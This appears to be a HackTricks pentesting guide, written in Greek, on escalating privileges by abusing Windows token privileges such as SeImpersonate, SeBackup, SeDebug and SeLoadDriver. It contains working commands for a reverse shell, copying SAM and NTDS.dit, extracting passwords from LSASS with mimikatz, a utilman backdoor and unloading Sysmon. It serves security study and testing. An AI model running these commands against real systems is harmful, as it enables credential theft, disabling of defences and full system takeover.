# Κατάχρηση Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Αν **δεν γνωρίζετε τι είναι τα Windows Access Tokens**, διαβάστε αυτή τη σελίδα πριν συνεχίσετε:


{{#ref}}
access-tokens.md
{{#endref}}

**Ενδέχεται να μπορέσετε να κλιμακώσετε τα προνόμιά σας κάνοντας κατάχρηση των tokens που ήδη έχετε.**

### SeImpersonatePrivilege

Αυτό το προνόμιο επιτρέπει σε μια διεργασία να κάνει impersonate (όχι να δημιουργήσει) ένα token, όταν μπορεί να αποκτήσει ένα handle σε αυτό το token. Ένα προνομιούχο token μπορεί να αποκτηθεί από μια υπηρεσία των Windows (DCOM), προκαλώντας την να εκτελέσει NTLM authentication προς ένα exploit, και στη συνέχεια να επιτρέψει την εκτέλεση μιας διεργασίας με προνόμια SYSTEM.<sup>[[2]](#references)</sup> Αυτό το primitive μπορεί να αξιοποιηθεί με εργαλεία όπως τα [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (το οποίο απαιτεί να είναι απενεργοποιημένο το WinRM), [SweetPotato](https://github.com/CCob/SweetPotato) και [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Μια web εφαρμογή που ακούει μόνο στο loopback μπορεί να αποτελέσει ξεχωριστό πιθανό σημείο εξαναγκασμού, αν ένας τοπικός χρήστης μπορεί να προσπελάσει ένα authenticated endpoint το οποίο κάνει request σε URL που επιλέγει ο caller, εκτελώντας το με πιο προνομιούχο identity. Ελέγξτε την εξουσιοδότηση του endpoint και τους περιορισμούς URL, το πραγματικό identity του outbound client και τη συμπεριφορά authentication, καθώς και το αν ο client μπορεί να επικοινωνήσει με listener που ελέγχει ο χρήστης με τα λιγότερα προνόμια. Η ενεργοποιημένη `SeImpersonatePrivilege`, ένας IIS listener ή μια παράμετρος URL-fetch από μόνα τους δεν αποδεικνύουν την ύπαρξη προνομιούχου token ή διαδρομής κλιμάκωσης προνομίων. Κρατήστε αυτόν τον έλεγχο παθητικό· μην στέλνετε requests εξαναγκασμού κατά την απαρίθμηση. Δείτε την τεκμηρίωση της Microsoft για το [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) και το [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Σύγχρονες σημειώσεις για operators:

- **Το JuicyPotato είναι παρωχημένο**: σε Windows 10 1809+/Server 2019+, προτιμήστε τα **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ή **PrintSpoofer**, ανάλογα με το ποια επιφάνεια RPC/COM παραμένει προσβάσιμη.
- Αν παραβιάσατε μια υπηρεσία που εκτελείται ως **`LOCAL SERVICE`** ή **`NETWORK SERVICE`** και το `whoami /priv` εμφανίζει **filtered token** χωρίς `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ανακτήστε πρώτα το **default privilege set** του λογαριασμού (για παράδειγμα, με το **FullPowers**) και δοκιμάστε ξανά στη συνέχεια την οικογένεια potato.<sup>[[3]](#references)</sup>
- Ορισμένα νεότερα forks είναι πιο φιλικά προς τους operators από τα αρχικά εργαλεία. Για παράδειγμα, το **SigmaPotato** προσθέτει reflection/in-memory execution και συμβατότητα με σύγχρονα Windows, ενώ το **PrintNotifyPotato** κάνει κατάχρηση της υπηρεσίας COM PrintNotify και συχνά είναι χρήσιμο όταν η κλασική διαδρομή μέσω Spooler είναι απενεργοποιημένη.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Είναι πολύ παρόμοιο με το **SeImpersonatePrivilege**· χρησιμοποιεί την **ίδια μέθοδο** για να αποκτήσει ένα προνομιούχο token.\
Στη συνέχεια, αυτό το privilege επιτρέπει την **ανάθεση ενός primary token** σε μια νέα ή σε μια suspended process. Με το προνομιούχο impersonation token μπορείτε να παράγετε ένα primary token (DuplicateTokenEx).\
Με το token, μπορείτε να δημιουργήσετε μια **νέα process** με το 'CreateProcessAsUser' ή να δημιουργήσετε μια suspended process και να **ορίσετε το token** (γενικά, δεν μπορείτε να τροποποιήσετε το primary token μιας process που εκτελείται).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Αν έχετε ενεργοποιήσει αυτό το token, μπορείτε να χρησιμοποιήσετε το **KERB_S4U_LOGON** για να αποκτήσετε ένα **impersonation token** για οποιονδήποτε άλλο χρήστη χωρίς να γνωρίζετε τα διαπιστευτήριά του, να **προσθέσετε μια αυθαίρετη ομάδα** (admins) στο token, να ορίσετε το **integrity level** του token σε "**medium**" και να αναθέσετε αυτό το token στο **τρέχον thread** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Με αυτό το privilege, το σύστημα παρέχει **πρόσβαση ανάγνωσης σε όλα τα αρχεία** (περιορισμένη σε λειτουργίες ανάγνωσης). Χρησιμοποιείται για την **ανάγνωση των password hashes των τοπικών λογαριασμών Administrator** από το registry, και στη συνέχεια μπορούν να χρησιμοποιηθούν εργαλεία όπως τα "**psexec**" ή "**wmiexec**" με το hash (τεχνική Pass-the-Hash). Ωστόσο, αυτή η τεχνική αποτυγχάνει σε δύο περιπτώσεις: όταν ο λογαριασμός Local Administrator είναι απενεργοποιημένος ή όταν υπάρχει πολιτική που αφαιρεί τα δικαιώματα διαχειριστή από τους Local Administrators που συνδέονται απομακρυσμένα.<sup>[[2]](#references)</sup>\
Στην πράξη, η πιο αξιόπιστη ενσωματωμένη ροή εργασίας είναι συνήθως **VSS + `robocopy /b`**: δημιουργήστε ή εκθέστε ένα shadow copy και, στη συνέχεια, αντιγράψτε τα `SAM`/`SYSTEM` ή το `NTDS.dit` σε **backup mode**, παρακάμπτοντας τα ACL των αρχείων.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Μπορείτε να **καταχραστείτε αυτό το προνόμιο** με:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- ακολουθώντας τον **IppSec** στο [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ή όπως εξηγείται στην ενότητα **κλιμάκωση προνομίων με Backup Operators** του:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Αυτό το προνόμιο παρέχει **πρόσβαση εγγραφής** σε οποιοδήποτε αρχείο συστήματος, ανεξάρτητα από τη Λίστα Ελέγχου Πρόσβασης (ACL) του αρχείου. Προσφέρει πολλές δυνατότητες κλιμάκωσης, όπως τη δυνατότητα **τροποποίησης υπηρεσιών**, εκτέλεσης DLL Hijacking και ορισμού **debuggers** μέσω των Image File Execution Options, μεταξύ άλλων τεχνικών.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

Το SeCreateTokenPrivilege είναι ένα ισχυρό δικαίωμα, ιδιαίτερα χρήσιμο όταν ένας χρήστης έχει τη δυνατότητα να κάνει impersonation tokens, αλλά και όταν δεν διαθέτει SeImpersonatePrivilege. Αυτή η δυνατότητα βασίζεται στην ικανότητα να γίνεται impersonation ενός token που αντιπροσωπεύει τον ίδιο χρήστη και του οποίου το επίπεδο ακεραιότητας δεν υπερβαίνει εκείνο της τρέχουσας διεργασίας.<sup>[[2]](#references)</sup>

**Βασικά σημεία:**

- **Impersonation χωρίς SeImpersonatePrivilege:** Είναι δυνατό να αξιοποιηθεί το SeCreateTokenPrivilege για EoP μέσω impersonation tokens υπό συγκεκριμένες συνθήκες.
- **Προϋποθέσεις για Token Impersonation:** Για επιτυχημένο impersonation, το token-στόχος πρέπει να ανήκει στον ίδιο χρήστη και να έχει επίπεδο ακεραιότητας μικρότερο ή ίσο με εκείνο της διεργασίας που επιχειρεί το impersonation.
- **Δημιουργία και τροποποίηση Impersonation Tokens:** Οι χρήστες μπορούν να δημιουργήσουν ένα impersonation token και να το ενισχύσουν προσθέτοντας το SID (Security Identifier) μιας προνομιούχας ομάδας.

### SeLoadDriverPrivilege

Αυτό το προνόμιο επιτρέπει σε μια διεργασία να **φορτώνει και να εκφορτώνει drivers συσκευών**, δημιουργώντας μια καταχώριση μητρώου με συγκεκριμένες τιμές `ImagePath` και `Type`. Επειδή η άμεση πρόσβαση εγγραφής στο `HKLM` (HKEY_LOCAL_MACHINE) είναι περιορισμένη, μπορεί να χρησιμοποιηθεί το `HKCU` (HKEY_CURRENT_USER). Ωστόσο, απαιτείται μια συγκεκριμένη διαδρομή ώστε ο πυρήνας να αναγνωρίζει την καταχώριση `HKCU` ως ρύθμιση driver.<sup>[[2]](#references)</sup>

Η σύγχρονη επιθετική χρήση συνήθως βασίζεται στο **BYOVD** (bring your own vulnerable driver): φορτώνεται ένας **υπογεγραμμένος αλλά ευάλωτος** kernel driver και στη συνέχεια χρησιμοποιούνται τα IOCTL του για την απενεργοποίηση προστασιών ή την επίτευξη εκτέλεσης κώδικα στον πυρήνα. Λάβετε υπόψη ότι σε πρόσφατες εκδόσεις Windows 11/Server, η **λίστα αποκλεισμού ευάλωτων drivers της Microsoft** ή/και το **HVCI/Memory Integrity** συχνά ακυρώνουν παλαιότερες δημόσιες αλυσίδες, επομένως τα κλασικά παραδείγματα τύπου `szkg64.sys` δεν είναι πλέον αξιόπιστα σε όλες τις περιπτώσεις.

Η διαδρομή είναι `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, όπου το `<RID>` είναι το Relative Identifier του τρέχοντος χρήστη. Μέσα στο `HKCU`, πρέπει να δημιουργηθεί ολόκληρη αυτή η διαδρομή και να οριστούν δύο τιμές:<sup>[[2]](#references)</sup>

- `ImagePath`, δηλαδή η διαδρομή προς το εκτελέσιμο αρχείο
- `Type`, με τιμή `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Βήματα:**

1. Χρησιμοποιήστε το `HKCU` αντί για το `HKLM`, λόγω της περιορισμένης πρόσβασης εγγραφής.
2. Δημιουργήστε τη διαδρομή `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` μέσα στο `HKCU`, όπου το `<RID>` αντιστοιχεί στο Relative Identifier του τρέχοντος χρήστη.
3. Ορίστε το `ImagePath` στη διαδρομή εκτέλεσης του δυαδικού αρχείου.
4. Ορίστε το `Type` σε `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Περισσότεροι τρόποι κατάχρησης αυτού του privilege στο [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Αυτό είναι παρόμοιο με το **SeRestorePrivilege**. Η κύρια λειτουργία του επιτρέπει σε μια διεργασία να **αναλάβει την ιδιοκτησία ενός αντικειμένου**, παρακάμπτοντας την απαίτηση για ρητή διακριτική πρόσβαση μέσω της παροχής δικαιωμάτων πρόσβασης WRITE_OWNER. Η διαδικασία περιλαμβάνει πρώτα την εξασφάλιση της ιδιοκτησίας του επιθυμητού registry key για σκοπούς εγγραφής και, στη συνέχεια, την τροποποίηση του DACL ώστε να επιτρέπονται οι εγγραφές.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Αυτό το privilege επιτρέπει το **debugging άλλων processes**, συμπεριλαμβανομένης της ανάγνωσης και της εγγραφής στη μνήμη. Με αυτό το privilege μπορούν να χρησιμοποιηθούν διάφορες στρατηγικές memory injection, οι οποίες μπορούν να παρακάμψουν τις περισσότερες λύσεις antivirus και host intrusion prevention.<sup>[[2]](#references)</sup>

Στις σύγχρονες εκδόσεις των Windows, να θυμάστε ότι το `SeDebugPrivilege` συνήθως αρκεί για να ανοίξετε **μη προστατευμένα SYSTEM processes** και να αντιγράψετε τα tokens τους, αλλά **δεν** εγγυάται ότι μπορείτε να αποκτήσετε πρόσβαση στο **LSASS**. Αν είναι ενεργοποιημένο το **RunAsPPL / LSA Protection**, τα μη προστατευμένα processes δεν μπορούν να διαβάσουν το LSASS ή να εισάγουν κώδικα σε αυτό, ακόμη κι αν υπάρχει το `SeDebugPrivilege`. Σε αυτή την περίπτωση, κλέψτε ένα token από κάποιο άλλο μη-PPL SYSTEM process ή συνδυάστε το με PPL bypass/BYOVD, αντί να θεωρείτε δεδομένο ότι θα λειτουργήσει το `procdump`. Για ένα πλήρες παράδειγμα αντιγραφής token με χρήση των `SeDebugPrivilege` + `SeImpersonatePrivilege`, δείτε [αυτή τη σελίδα](sedebug-+-seimpersonate-copy-token.md).

#### Dump μνήμης

Μπορείτε να χρησιμοποιήσετε το [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) από το [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) για να **καταγράψετε τη μνήμη ενός process**. Συγκεκριμένα, αυτό μπορεί να εφαρμοστεί στο process **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, το οποίο είναι υπεύθυνο για την αποθήκευση των διαπιστευτηρίων των χρηστών μόλις συνδεθούν επιτυχώς σε ένα σύστημα.

Στη συνέχεια, μπορείτε να φορτώσετε αυτό το dump στο mimikatz για να αποκτήσετε κωδικούς πρόσβασης:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Ένα προηγουμένως αποθηκευμένο, αναγνώσιμο LSASS dump μπορεί να είναι διαθέσιμο, ακόμη κι αν ο τρέχων λογαριασμός δεν έχει δικαίωμα καταγραφής της ζωντανής προστατευμένης διεργασίας. Αντιμετωπίστε ένα dump file ή ένα αρχείο με παρόμοιο όνομα μόνο ως ένδειξη: επαληθεύστε την πρόσβαση και τα περιεχόμενά του και, στη συνέχεια, αξιολογήστε αν τυχόν ανακτημένα διαπιστευτήρια εξακολουθούν να είναι έγκυρα και παρέχουν περιβάλλον με υψηλότερα δικαιώματα. Τα ονόματα αρχείων από μόνα τους δεν αποδεικνύουν ότι ένα αρχείο περιέχει dump ή ότι τα διαπιστευτήρια μπορούν να χρησιμοποιηθούν ξανά.

#### RCE

Αν θέλετε να αποκτήσετε ένα `NT SYSTEM` shell, μπορείτε να χρησιμοποιήσετε:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Αυτό το δικαίωμα (Εκτέλεση εργασιών συντήρησης τόμων) μπορεί να επιτρέψει προνομιακές λειτουργίες τόμων, αλλά από μόνο του δεν εγγυάται ένα αναγνώσιμο raw-volume handle ή αυθαίρετη πρόσβαση σε αρχεία. Τα ACLs συσκευών, η κατάσταση του token, η έκδοση των Windows και η ζητούμενη λειτουργία εξακολουθούν να έχουν σημασία. Μια επιτρεπόμενη λειτουργία ελέγχου τόμου μπορεί αντί γι’ αυτό να αλλάξει τα ACLs του filesystem· πρόκειται για ενέργεια που τροποποιεί δεδομένα και ενδέχεται να επηρεάσει ολόκληρο τον τόμο. Σε έναν CA host, η κατάχρηση πιστοποιητικών απαιτεί επίσης πρόσβαση σε αξιοποιήσιμο υλικό ιδιωτικού κλειδιού, ενώ για αρχεία που προστατεύονται από EFS εξακολουθεί να απαιτείται εξουσιοδοτημένο κλειδί αποκρυπτογράφησης ή ανάκτησης. Δείτε τις λεπτομερείς προϋποθέσεις παρακάτω.<sup>[[5]](#references)</sup>

Δείτε λεπτομερείς τεχνικές και μέτρα μετριασμού:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Έλεγχος προνομίων

```
whoami /priv
```

Τα **tokens που εμφανίζονται ως απενεργοποιημένα** μπορούν συνήθως να ενεργοποιηθούν, επομένως μπορείτε συχνά να καταχραστείτε τόσο τα προνόμια _Ενεργοποιημένα_ όσο και τα _Απενεργοποιημένα_.

### Ενεργοποίηση όλων των tokens

Αν έχετε απενεργοποιημένα προνόμια, μπορείτε να χρησιμοποιήσετε το script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) για να ενεργοποιήσετε όλα τα tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ή το **script** που είναι ενσωματωμένο σε αυτή την [**ανάρτηση**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Πίνακας

Πλήρες cheatsheet δικαιωμάτων token στο [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), η παρακάτω σύνοψη παραθέτει μόνο άμεσους τρόπους exploit του δικαιώματος για απόκτηση admin session ή ανάγνωση ευαίσθητων αρχείων.<sup>[[1]](#references)</sup>

| Δικαίωμα                  | Επίπτωση      | Εργαλείο                | Διαδρομή εκτέλεσης                                                                                                                                                                                                                                                                                                                                     | Παρατηρήσεις                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`SeAssignPrimaryToken`** | _**Admin**_ | εργαλείο τρίτου μέρους   | _"Θα επέτρεπε σε έναν χρήστη να κάνει impersonate tokens και privesc σε nt system χρησιμοποιώντας εργαλεία όπως τα potato.exe, rottenpotato.exe και juicypotato.exe"_                                                                                                                                                                                                      | Ευχαριστώ τον [Aurélien Chalot](https://twitter.com/Defte_) για την ενημέρωση. Σύντομα θα προσπαθήσω να το διατυπώσω ξανά ως κάτι πιο κοντά σε συνταγή.                                                                                                                                                                                         |
| **`SeBackup`**             | **Απειλή**  | _**Ενσωματωμένες εντολές**_ | Ανάγνωση ευαίσθητων αρχείων με `robocopy /b` ή ειδικά βοηθητικά εργαλεία αντιγραφής που υποστηρίζουν SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ιδανικό για τα `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` και, μερικές φορές, το `%WINDIR%\MEMORY.DMP`.<br><br>- Το `robocopy` είναι βολικό, αλλά τα ειδικά SeBackup cmdlets/APIs είναι συχνά πιο ευέλικτα για κλειδωμένα/ανοιχτά αρχεία.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | εργαλείο τρίτου μέρους   | Δημιουργία αυθαίρετου token, συμπεριλαμβανομένων τοπικών δικαιωμάτων admin, με το `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Αντιγραφή ενός token SYSTEM που δεν είναι **PPL** ή εξαγωγή της μνήμης από μια μη προστατευμένη διεργασία.                                                                                                                                                                                                                                                                 | <p>Η εξαγωγή του LSASS συνήθως αποκλείεται αν είναι ενεργοποιημένο το RunAsPPL/LSA Protection.</p><p>Το script βρίσκεται στο [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | εργαλείο τρίτου μέρους   | Χρήση της **οικογένειας Potato** / impersonation named-pipe για εκκίνηση SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` κ.λπ.).                                                                                                                                                                                    | <p>Πιο πρακτικό από λογαριασμούς υπηρεσιών όπως IIS APPPOOL, MSSQL, προγραμματισμένες εργασίες ή οποιοδήποτε περιβάλλον διαθέτει ήδη το `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | εργαλείο τρίτου μέρους   | <p>1. Φόρτωση ενός υπογεγραμμένου αλλά ευάλωτου kernel driver (BYOVD)<br>2. Χρήση των IOCTL του driver για απόκτηση kernel R/W, απενεργοποίηση εργαλείων ασφαλείας ή κλιμάκωση σε SYSTEM<br><br>Εναλλακτικά, το δικαίωμα μπορεί να χρησιμοποιηθεί για την αφαίρεση drivers που σχετίζονται με την ασφάλεια με την ενσωματωμένη εντολή <code>fltMC</code>, π.χ. <code>fltMC sysmondrv</code></p>                     | <p>Παλαιότεροι δημόσιοι drivers όπως το <code>szkg64.sys</code> αποκλείονται όλο και περισσότερο στα σύγχρονα Windows από τη λίστα αποκλεισμού ευάλωτων drivers / το HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Εκκίνηση του PowerShell/ISE με ενεργό το δικαίωμα SeRestore.<br>2. Ενεργοποίηση του δικαιώματος με το <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Μετονομασία του utilman.exe σε utilman.old<br>4. Μετονομασία του cmd.exe σε utilman.exe<br>5. Κλείδωμα της κονσόλας και πάτημα του Win+U</p> | <p>Η επίθεση μπορεί να εντοπιστεί από ορισμένα προγράμματα AV.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση εκτελέσιμων αρχείων υπηρεσιών που είναι αποθηκευμένα στο "Program Files" με χρήση του ίδιου δικαιώματος</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Ενσωματωμένες εντολές**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Μετονομασία του cmd.exe σε utilman.exe<br>4. Κλείδωμα της κονσόλας και πάτημα του Win+U</p>                                                                                                                                       | <p>Η επίθεση μπορεί να εντοπιστεί από ορισμένα προγράμματα AV.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση εκτελέσιμων αρχείων υπηρεσιών που είναι αποθηκευμένα στο "Program Files" με χρήση του ίδιου δικαιώματος.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | εργαλείο τρίτου μέρους   | <p>Χειρισμός tokens ώστε να περιλαμβάνουν τοπικά δικαιώματα admin. Μπορεί να απαιτείται το SeImpersonate.</p><p>Προς επαλήθευση.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - διαδρομές exploit από δικαιώματα Windows σε admin](https://github.com/gtworek/Priv2Admin)
- [2] [Κατάχρηση δικαιωμάτων Token για LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Δώστε μου πίσω τα δικαιώματά μου! Παρακαλώ;](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (η λειτουργία δημιουργίας αντιγράφων ασφαλείας `/b` παρακάμπτει τους ελέγχους ACL αρχείων/φακέλων)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Εκτέλεση εργασιών συντήρησης τόμων (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → εξαγωγή κλειδιού CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
